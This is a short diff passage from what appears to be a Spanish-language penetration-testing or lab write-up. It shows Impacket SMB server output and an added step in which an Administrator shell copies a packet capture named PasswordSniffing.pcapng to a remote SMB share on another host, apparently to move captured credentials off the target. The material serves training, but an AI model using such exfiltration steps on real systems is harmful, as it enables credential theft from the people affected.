@@ -18,3 +18,10 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] User DC-TIZONAL\DC-TIZONAL$ authenticated successfully
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
+Para copiar un recurso desde windows utilizamos el comando copy
+```java
+C:\Users\Administrator\Desktop>copy PasswordSniffing.pcapng \\192.168.200.147\smbFolder
+        1 file(s) copied.
+
+C:\Users\Administrator\Desktop>
+```
